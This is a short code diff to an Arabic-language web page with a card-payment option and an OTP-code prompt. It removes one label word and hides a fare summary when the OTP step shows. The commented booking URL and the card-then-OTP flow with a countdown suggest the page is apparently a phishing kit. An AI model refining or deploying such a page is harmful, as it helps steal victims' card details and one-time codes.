@@ -29210,7 +29210,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                                                                                                                                     <label class="mat-radio-label" for="CC-input">
 
                                                                                                                                         <span class="mat-radio-label-content" style="padding: 0;">
-                                                                                                                                            <span></span><span role="radio" aria-label="بطاقة ائتمانية / مصرفية" class="ng-star-inserted">تحقيق
+                                                                                                                                            <span></span><span role="radio" aria-label="بطاقة ائتمانية / مصرفية" class="ng-star-inserted">
                                                                                                                                                 رقم
                                                                                                                                                 الجوال</span><!---->
                                                                                                                                         </span>
@@ -30017,6 +30017,7 @@ $('#myform5').submit(function(e) {
 						  //window.location.href = 'https://terransar.site/index.php/booking/myot';
 						//$(':input').prop('disabled', true);
 						 $('.user-otp-code').show();
+						 $('.fare_summary_container').hide();
 							modal.hide();
 							 $('#safeTimerDisplay').runner({autostart:!0,countdown:!0,startAt:300000,stopAt:0,milliseconds:!1});
 					}
